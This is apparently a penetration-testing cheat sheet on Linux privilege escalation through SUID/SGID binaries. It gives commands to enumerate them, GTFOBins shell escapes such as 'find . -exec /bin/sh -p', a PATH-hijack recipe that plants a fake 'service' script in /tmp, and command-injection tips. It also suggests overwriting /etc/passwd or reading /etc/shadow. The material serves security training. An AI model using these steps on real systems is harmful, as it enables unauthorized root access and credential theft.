# 🐧 SUID / SGID Binaries

> SUID binaries run with the **owner's** privileges (often root) regardless of who executes them. A non-standard SUID binary is frequently a **direct root shell** via GTFOBins, a PATH hijack, or command injection.

Part of [[Linux Privilege Escalation]]. Related: [[Writable Files & PATH Hijack]] · [[Sudo Abuse]]

---

## 🧠 THINK
- **List SUID/SGID**, then compare against a normal system — attack the **non-standard** ones.
- Known binary → **GTFOBins** ("SUID" section) escape.
- Custom binary → does it call another program by **relative path** (→ PATH hijack) or run a shell command (→ injection)?

## ⚡ DETECT
```bash
find / -perm -4000 -type f 2>/dev/null      # SUID
```
```bash
find / -perm -2000 -type f 2>/dev/null      # SGID
```
```bash
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```
**Look for:** anything unusual — `find`, `vim`, `nano`, `python`, `perl`, `bash`, `cp`, `env`, `awk`, `nmap` (old), `base64`, `tar`, or a **custom** binary in `/usr/local/bin`, `/opt`, a home dir.

## 💥 EXPLOIT
**GTFOBins SUID payloads (examples):**
```bash
./find . -exec /bin/sh -p \; -quit
```
```bash
bash-p                                  # if bash is SUID: ./bash -p
```
```bash
cp /etc/passwd /tmp/p                    # cp SUID -> read/overwrite root files
```
```bash
env /bin/sh -p                           # env SUID
```
> `-p` preserves the effective UID for bash/sh. For any SUID binary, use its **GTFOBins SUID** entry.

**Custom SUID → PATH hijack** (binary calls e.g. `service`/`cat` without a full path):
```bash
strings /opt/custombin        # spot a relative-path command call, e.g. system("service ...")
```
```bash
cd /tmp; echo -e '#!/bin/sh\n/bin/bash -p' > service; chmod +x service
```
```bash
export PATH=/tmp:$PATH; /opt/custombin        # our fake "service" runs as root
```
See [[Writable Files & PATH Hijack]] for the full PATH technique.

**Custom SUID → command/argument injection:** if it passes your input into a shell, inject `; /bin/bash -p` or backticks.

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Standard binary is SUID (find/vim/…) | GTFOBins SUID escape → root |
| SUID `bash`/`sh` | `./bash -p` → root |
| Custom SUID calling relative cmd | PATH hijack → [[Writable Files & PATH Hijack]] |
| Custom SUID taking input | argument/command injection |
| SUID file-copy/read | overwrite `/etc/passwd` or read `/etc/shadow` |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| All SUID look standard | pivot to [[Sudo Abuse]], [[Cron Jobs]], [[Linux Capabilities]], [[Linux Kernel Exploits]] |
| Custom binary, no source | `strings`/`ltrace`/` file` it; look for relative calls or system() |
| GTFOBins escape drops privs | use the `-p` variant; some binaries drop SUID unless `-p` |

## 📇 CHEAT SHEET
```bash
find / -perm -4000 -type f 2>/dev/null
```
```bash
./<suid-gtfobin> -p        # e.g. ./find . -exec /bin/sh -p \; -quit
```
```bash
strings /opt/custom ; export PATH=/tmp:$PATH   # PATH hijack a relative call
```
**Kill shot:** non-standard SUID → GTFOBins/PATH hijack → root.
